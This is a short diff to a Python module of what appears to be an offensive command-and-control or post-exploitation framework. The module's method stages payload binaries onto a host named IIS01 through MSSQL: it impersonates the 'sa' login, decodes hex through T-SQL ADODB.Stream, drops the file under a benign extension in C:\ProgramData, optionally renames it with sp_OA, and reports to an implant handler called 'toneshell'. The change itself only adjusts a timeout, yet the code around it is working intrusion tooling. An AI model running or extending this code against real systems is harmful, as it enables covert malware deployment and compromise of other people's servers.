@@ -28,7 +28,7 @@ class StagingMixin:
         self._exec_q(shell, "EXECUTE AS LOGIN='sa';IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
         print(f"[+] xpstage done: {out_path}")
 
-    def cmd_xpstage_hex(self, shell, payload_name: str, timeout_s: int = 120, rename: bool = False):
+    def cmd_xpstage_hex(self, shell, payload_name: str, timeout_s: int = None, rename: bool = False):
         """Stage binary to IIS01 via hex SQL + T-SQL ADODB.Stream decode (no .ps1).
 
         Default: the decode batch writes the binary to C:\\ProgramData as
@@ -36,6 +36,10 @@ class StagingMixin:
         is executed directly from the benign-extension file. With rename=True,
         a sp_OA FSO MoveFile in the same decode batch renames it back to the
         original payload_name before use.
+
+        timeout_s (optional): implant wait-limit override for the decode batch
+        (None = operator `timeout <n>` value; the poll itself blocks until the
+        task terminates). Decode of a multi-MB payload can take minutes.
         """
         resp = shell._post_json("/api/v1.0/mssql/stage", {
             "handler": "toneshell",
